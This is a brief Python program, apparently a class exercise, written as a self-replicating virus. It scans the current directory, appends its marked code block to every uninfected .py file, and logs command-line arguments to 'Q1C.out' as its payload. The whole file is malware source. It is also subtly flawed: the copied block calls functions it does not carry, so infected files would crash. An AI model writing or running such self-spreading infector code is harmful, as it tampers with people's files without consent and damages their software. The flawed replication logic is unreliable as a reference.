import os
import sys

def get_virus_code():
    with open(__file__, 'r') as f:
        code = f.readlines()
    virus_code = []
    in_virus = False
    for line in code:
        if line.strip() == '# VIRUS_START':
            in_virus = True
        if in_virus:
            virus_code.append(line)
        if line.strip() == '# VIRUS_END':
            break
    return ''.join(virus_code)

def infect(file_path):
    if not file_path.endswith('.py'):
        return
    with open(file_path, 'r') as f:
        content = f.read()
    if '# VIRUS_START' in content:
        return
    virus_code = get_virus_code()
    new_content = content + '\n' + virus_code
    with open(file_path, 'w') as f:
        f.write(new_content)

def propagate():
    for file in os.listdir('.'):
        infect(file)

def payload():
    with open('Q1C.out', 'a') as f:
        f.write(f"{' '.join(sys.argv)}\\n")

# VIRUS_START
if __name__ == "__main__":
    propagate()
    payload()
# VIRUS_END
